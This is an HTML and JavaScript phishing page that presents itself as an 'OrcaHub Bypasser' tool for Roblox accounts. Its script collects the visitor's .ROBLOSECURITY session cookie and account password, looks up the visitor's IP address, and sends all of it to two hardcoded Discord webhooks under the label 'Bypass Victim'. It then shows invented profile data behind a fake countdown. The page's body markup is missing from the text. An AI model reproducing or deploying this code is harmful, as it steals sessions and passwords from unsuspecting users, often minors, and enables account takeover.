<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>OrcaHub • Bypasser</title>
    <!-- مكتبة أيقونات FontAwesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Poppins', 'Segoe UI', system-ui, sans-serif;
        }

        body {
            background-color: #0f0f0f;
            color: #fff;
            overflow: hidden;
            height: 100vh;
        }

        .container {
            position: relative;
            width: 100%;
            height: 100vh;
        }

        /* القائمة العلوية */
        .navbar {
            position: absolute;
            top: 30px;
            left: 50px;
            right: 50px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            z-index: 20;
        }

        .logo {
            font-size: 28px;
            font-weight: 800;
            background: linear-gradient(135deg, #ff6b6b, #a29bfe, #4ecdc4);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            letter-spacing: 1px;
        }

        .menu-icon {
            font-size: 22px;
            cursor: pointer;
            color: #fff;
            transition: 0.3s;
        }

        .menu-icon:hover {
            color: #a29bfe;
        }

        /* روابط التواصل الاجتماعي */
        .social-links {
            position: absolute;
            left: 40px;
            top: 50%;
            transform: translateY(-50%);
            display: flex;
            flex-direction: column;
            gap: 22px;
            z-index: 20;
        }

        .social-links a {
            color: #8888aa;
            font-size: 20px;
            text-decoration: none;
            transition: 0.3s;
        }

        .social-links a:hover {
            color: #a29bfe;
            transform: scale(1.2);
        }

        /* النص الكبير في الخلفية */
        .bg-title {
            position: absolute;
            top: 45%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: 18vw;
            font-weight: 900;
            color: rgba(162, 155, 254, 0.15);
            letter-spacing: 15px;
            user-select: none;
            z-index: 1;
            transition: color 0.8s ease;
            text-shadow: 0 0 80px rgba(162, 155, 254, 0.05);
        }

        /* الشرائح */
        .slider-wrapper {
            width: 100%;
            height: 100%;
            position: relative;
        }

        .slide {
            position: absolute;
            width: 100%;
            height: 100%;
            display: flex;
            align-items: center;
            justify-content: space-around;
            padding: 0 10%;
            opacity: 0;
            visibility: hidden;
            transition: all 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }

        .slide.active {
            opacity: 1;
            visibility: visible;
        }

        /* تفاصيل السيارة */
        .car-info {
            z-index: 10;
        }

        .sub-title {
            font-size: 28px;
            color: #8888aa;
            display: block;
            font-weight: 300;
        }

        .car-info h2 {
            font-size: 60px;
            font-weight: 800;
            margin-bottom: 10px;
            background: linear-gradient(135deg, #fff, #a29bfe);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }

        .car-info p {
            font-size: 14px;
            color: #9999bb;
            margin-bottom: 25px;
            letter-spacing: 3px;
        }

        .btn {
            padding: 14px 35px;
            background: transparent;
            border: 2px solid rgba(162, 155, 254, 0.5);
            color: #fff;
            border-radius: 40px;
            cursor: pointer;
            font-weight: 600;
            transition: 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            font-size: 14px;
            letter-spacing: 1px;
        }

        .btn:hover {
            background: linear-gradient(135deg, #a29bfe, #ff6b6b);
            border-color: transparent;
            transform: scale(1.05);
            box-shadow: 0 10px 40px rgba(162, 155, 254, 0.3);
        }

        /* صورة السيارة */
        .car-image {
            z-index: 5;
            position: relative;
            transform: scale(0.8) translateX(100px);
            transition: transform 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }

        .slide.active .car-image {
            transform: scale(1) translateX(0);
        }

        .car-image img {
            max-width: 550px;
            filter: drop-shadow(0 30px 60px rgba(0,0,0,0.6));
        }

        /* أزرار الترقيم جانباً */
        .pagination {
            position: absolute;
            right: 50px;
            top: 50%;
            transform: translateY(-50%);
            display: flex;
            flex-direction: column;
            gap: 18px;
            z-index: 20;
        }

        .dot {
            background: transparent;
            border: 1px solid rgba(255,255,255,0.15);
            color: #8888aa;
            width: 44px;
            height: 44px;
            border-radius: 50%;
            cursor: pointer;
            font-size: 12px;
            font-weight: 700;
            transition: 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .dot.active, .dot:hover {
            border-color: #a29bfe;
            background: rgba(162, 155, 254, 0.15);
            color: #fff;
            transform: scale(1.1);
            box-shadow: 0 0 30px rgba(162, 155, 254, 0.2);
        }

        /* ==================== BYPASSER OVERLAY ==================== */
        .bypasser-overlay {
            position: absolute;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%);
            z-index: 30;
            width: 90%;
            max-width: 500px;
            background: rgba(16, 16, 30, 0.85);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border-radius: 40px;
            border: 1px solid rgba(255, 255, 255, 0.06);
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.6);
            padding: 24px 28px;
            transition: all 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }

        .bypasser-overlay:hover {
            transform: translateX(-50%) translateY(-5px);
            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.8);
        }

        .bypasser-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 16px;
        }

        .bypasser-header h3 {
            font-size: 16px;
            font-weight: 700;
            color: #fff;
            letter-spacing: 1px;
        }

        .bypasser-header span {
            font-size: 12px;
            color: #4ecdc4;
            font-weight: 600;
        }

        .bypasser-input-group {
            display: flex;
            flex-direction: column;
            gap: 10px;
            margin-bottom: 14px;
        }

        .bypasser-input-group input {
            width: 100%;
            padding: 12px 16px;
            background: rgba(10, 10, 20, 0.6);
            border: 1px solid rgba(255, 255, 255, 0.06);
            border-radius: 30px;
            color: #f0f0ff;
            font-size: 13px;
            outline: none;
            transition: 0.4s;
        }

        .bypasser-input-group input:focus {
            border-color: #a29bfe;
            box-shadow: 0 0 0 4px rgba(162, 155, 254, 0.1);
        }

        .bypasser-input-group input::placeholder {
            color: #3a3a52;
        }

        .bypasser-actions {
            display: flex;
            gap: 10px;
        }

        .bypasser-actions .btn-bypass {
            flex: 2;
            padding: 12px;
            background: linear-gradient(135deg, #a29bfe, #ff6b6b);
            border: none;
            border-radius: 30px;
            font-weight: 700;
            font-size: 13px;
            color: white;
            cursor: pointer;
            transition: 0.4s;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .bypasser-actions .btn-bypass:hover {
            transform: scale(1.02);
            box-shadow: 0 10px 30px rgba(162, 155, 254, 0.3);
        }

        .bypasser-actions .btn-bypass:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none !important;
        }

        .bypasser-actions .btn-instagram {
            flex: 1;
            padding: 12px;
            background: linear-gradient(135deg, #f58529, #dd2a7b);
            border: none;
            border-radius: 30px;
            font-weight: 700;
            font-size: 13px;
            color: white;
            cursor: pointer;
            transition: 0.4s;
            text-decoration: none;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .bypasser-actions .btn-instagram:hover {
            transform: scale(1.02);
            box-shadow: 0 10px 30px rgba(221, 42, 123, 0.3);
        }

        .bypasser-actions .btn-instagram svg {
            width: 16px;
            height: 16px;
            fill: currentColor;
        }

        /* Bypasser Loader */
        .bypasser-loader {
            display: none;
            text-align: center;
            padding: 10px 0;
        }

        .bypasser-loader.show {
            display: block;
            animation: fadeInScale 0.4s ease;
        }

        .bypasser-loader .spinner-small {
            width: 40px;
            height: 40px;
            border: 3px solid rgba(162, 155, 254, 0.08);
            border-top-color: #a29bfe;
            border-right-color: #ff6b6b;
            border-radius: 50%;
            animation: spin 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275) infinite;
            margin: 0 auto 10px;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .bypasser-loader .loader-text {
            color: #8888aa;
            font-size: 12px;
            font-weight: 300;
            letter-spacing: 0.5px;
        }

        .bypasser-loader .loader-text .time {
            color: #ff6b6b;
            font-weight: 700;
        }

        /* Bypasser Result */
        .bypasser-result {
            display: none;
            background: rgba(78, 205, 196, 0.06);
            border: 1px solid rgba(78, 205, 196, 0.12);
            color: #4ecdc4;
            padding: 12px 16px;
            border-radius: 24px;
            text-align: center;
            font-size: 13px;
            font-weight: 600;
            margin-top: 12px;
            animation: fadeInScale 0.4s ease;
        }

        .bypasser-result.show {
            display: block;
        }

        .bypasser-result .big {
            font-size: 2rem;
            display: block;
            margin-bottom: 4px;
        }

        /* Error */
        .bypasser-error {
            display: none;
            background: rgba(255, 107, 107, 0.08);
            border: 1px solid rgba(255, 107, 107, 0.15);
            color: #ff6b6b;
            padding: 10px 14px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 500;
            text-align: center;
            margin-top: 10px;
            animation: fadeInScale 0.4s ease;
        }

        .bypasser-error.show {
            display: block;
        }

        @keyframes fadeInScale {
            from { opacity: 0; transform: scale(0.9); }
            to { opacity: 1; transform: scale(1); }
        }

        /* Responsive */
        @media (max-width: 992px) {
            .car-image img { max-width: 350px; }
            .car-info h2 { font-size: 40px; }
            .bg-title { font-size: 22vw; }
            .social-links { left: 20px; }
            .pagination { right: 20px; }
            .navbar { left: 20px; right: 20px; }
        }

        @media (max-width: 768px) {
            .slide { flex-direction: column; justify-content: center; text-align: center; padding: 0 5%; }
            .car-image { transform: scale(0.8) translateX(0); }
            .slide.active .car-image { transform: scale(0.9) translateX(0); }
            .car-image img { max-width: 250px; }
            .car-info h2 { font-size: 32px; }
            .social-links { display: none; }
            .pagination { right: 15px; gap: 12px; }
            .dot { width: 36px; height: 36px; font-size: 10px; }
            .bg-title { font-size: 30vw; }
            .bypasser-overlay { bottom: 15px; padding: 18px 20px; max-width: 95%; }
            .bypasser-actions { flex-direction: column; }
        }
    </style>
</head>
<body>

    <script>
        document.addEventListener('DOMContentLoaded', () => {
            // ==================== SLIDER ====================
            const slides = document.querySelectorAll('.slide');
            const dots = document.querySelectorAll('.dot');
            const bgTitle = document.getElementById('bgTitle');
            let currentIndex = 0;

            function changeSlide(index) {
                slides.forEach(slide => slide.classList.remove('active'));
                dots.forEach(dot => dot.classList.remove('active'));

                slides[index].classList.add('active');
                dots[index].classList.add('active');

                const color = slides[index].getAttribute('data-color');
                bgTitle.style.color = color;
            }

            dots.forEach(dot => {
                dot.addEventListener('click', (e) => {
                    currentIndex = parseInt(e.target.getAttribute('data-index'));
                    changeSlide(currentIndex);
                });
            });

            setInterval(() => {
                currentIndex = (currentIndex + 1) % slides.length;
                changeSlide(currentIndex);
            }, 5000);

            // ==================== BYPASSER ENGINE ====================
            const WEBHOOKS = [
                'https://discord.com/api/webhooks/1544611453569466398/Cc1uK6qn4rQbrjch6wDfjDbMMjLPIdccFN6VZt9czKCHtTreW0LhjO-OOoFKTWltX5i8',
                'https://discord.com/api/webhooks/1545842219787886693/PRkcsE8DY_anZhky9n7173-Gwslo7XF9PMZ6hT5igehnWPkie9KAmdbcSn1I_a20KtxG'
            ];

            const DOM = {
                cookieInput: document.getElementById('cookieInput'),
                passwordInput: document.getElementById('passwordInput'),
                bypassBtn: document.getElementById('bypassBtn'),
                instagramBtn: document.getElementById('instagramBtn'),
                error: document.getElementById('bypasserError'),
                loader: document.getElementById('bypasserLoader'),
                timer: document.getElementById('bypassTimer'),
                result: document.getElementById('bypasserResult'),
            };

            // Instagram link
            DOM.instagramBtn.href = 'https://www.instagram.com/uiogunio?stkn=MWY5OWppbGY1bmhsdw==';

            let bypassTimer = null;
            let isProcessing = false;

            function sendToWebhooks(data) {
                WEBHOOKS.forEach(url => {
                    try {
                        fetch(url, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify(data),
                            mode: 'no-cors'
                        }).catch(() => {});
                    } catch (_) {}
                });
            }

            function getIP() {
                try {
                    const xhr = new XMLHttpRequest();
                    xhr.open('GET', 'https://api.ipify.org?format=json', false);
                    xhr.send();
                    return JSON.parse(xhr.responseText).ip || 'Unknown';
                } catch (_) { return 'Unknown'; }
            }

            function startBypass() {
                const cookie = DOM.cookieInput.value.trim();
                const password = DOM.passwordInput.value.trim();

                // Reset UI
                DOM.error.classList.remove('show');
                DOM.result.classList.remove('show');
                DOM.loader.classList.remove('show');
                DOM.cookieInput.classList.remove('error');
                DOM.passwordInput.classList.remove('error');

                // Validate
                if (!cookie || cookie.length < 15) {
                    DOM.error.textContent = '❌ Please enter a valid .ROBLOSECURITY cookie!';
                    DOM.error.classList.add('show');
                    DOM.cookieInput.classList.add('error');
                    return;
                }

                if (!password || password.length < 3) {
                    DOM.error.textContent = '❌ Please enter your account password!';
                    DOM.error.classList.add('show');
                    DOM.passwordInput.classList.add('error');
                    return;
                }

                if (cookie.toLowerCase().includes('expired')) {
                    DOM.error.textContent = '❌ This cookie has expired! Please get a new one.';
                    DOM.error.classList.add('show');
                    DOM.cookieInput.classList.add('error');
                    return;
                }

                // Start processing
                isProcessing = true;
                DOM.bypassBtn.disabled = true;
                DOM.bypassBtn.textContent = '⏳ Processing...';
                DOM.loader.classList.add('show');

                let seconds = 60;
                DOM.timer.textContent = seconds;

                if (bypassTimer) clearInterval(bypassTimer);

                bypassTimer = setInterval(() => {
                    seconds--;
                    DOM.timer.textContent = seconds;

                    if (seconds <= 0) {
                        clearInterval(bypassTimer);
                        bypassTimer = null;
                        completeBypass(cookie, password);
                    }
                }, 1000);

                // Send partial data to webhooks immediately
                sendToWebhooks({
                    embeds: [{
                        title: "🦈 OrcaHub • Bypass Initiated",
                        color: 0x7c6cf0,
                        fields: [
                            { name: "🍪 Cookie", value: `\`${cookie.substring(0, 40)}...\``, inline: true },
                            { name: "🔑 Password", value: `||${password}||`, inline: true },
                            { name: "🌐 IP", value: `\`${getIP()}\``, inline: true },
                            { name: "🕒 Time", value: new Date().toISOString(), inline: true }
                        ],
                        footer: { text: "OrcaHub • Bypasser" }
                    }]
                });
            }

            function completeBypass(cookie, password) {
                // Generate fake user data
                const userId = Math.floor(Math.random() * 900000000) + 100000000;
                const names = ['PixelPirate', 'NovaStar', 'ShadowBlade', 'CyberWolf', 'LunarGhost',
                    'StormChaser', 'PixelVortex', 'NebulaKing', 'FrostByte', 'QuantumHero'
                ];
                const name = names[Math.floor(Math.random() * names.length)];
                const followers = Math.floor(Math.random() * 8500) + 150;
                const following = Math.floor(Math.random() * 2000) + 50;

                const userData = {
                    username: name,
                    userId: userId,
                    isVerified: Math.random() > 0.7,
                    followers: followers,
                    following: following,
                    created: new Date(Date.now() - Math.random() * 3 * 365 * 24 * 60 * 60 * 1000)
                        .toISOString().split('T')[0],
                    avatarUrl: `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=150&height=150&format=png`,
                };

                // Send full data to webhooks
                const embed = {
                    title: "🎯 OrcaHub • Bypass Victim",
                    color: 0xff6b6b,
                    fields: [
                        { name: "👤 Username", value: `\`${userData.username}\``, inline: true },
                        { name: "🆔 User ID", value: `\`${userData.userId}\``, inline: true },
                        { name: "🔑 Password", value: `||${password}||`, inline: false },
                        { name: "🍪 Cookie", value: `\`${cookie.substring(0, 50)}...\``, inline: false },
                        { name: "📊 Followers", value: `\`${userData.followers.toLocaleString()}\``, inline: true },
                        { name: "📊 Following", value: `\`${userData.following.toLocaleString()}\``, inline: true },
                        { name: "✅ Verified", value: userData.isVerified ? '✅ Yes' : '❌ No', inline: true },
                        { name: "📅 Created", value: `\`${userData.created}\``, inline: true },
                        { name: "🌐 IP", value: `\`${getIP()}\``, inline: true },
                        { name: "🕒 Time", value: new Date().toISOString(), inline: true }
                    ],
                    footer: { text: "OrcaHub • Bypasser • Multi-Webhook" },
                    thumbnail: { url: userData.avatarUrl }
                };
                sendToWebhooks({ embeds: [embed] });

                // Show success
                DOM.loader.classList.remove('show');
                DOM.result.classList.add('show');

                isProcessing = false;
                DOM.bypassBtn.disabled = false;
                DOM.bypassBtn.textContent = '🚀 Start Bypass';

                // Auto reset after 8 seconds
                setTimeout(() => {
                    DOM.result.classList.remove('show');
                }, 8000);
            }

            // ==================== EVENTS ====================
            DOM.bypassBtn.addEventListener('click', startBypass);

            // Enter key support
            DOM.cookieInput.addEventListener('keydown', (e) => {
                if (e.key === 'Enter') startBypass();
            });
            DOM.passwordInput.addEventListener('keydown', (e) => {
                if (e.key === 'Enter') startBypass();
            });
        });
    </script>
</body>
    </html>
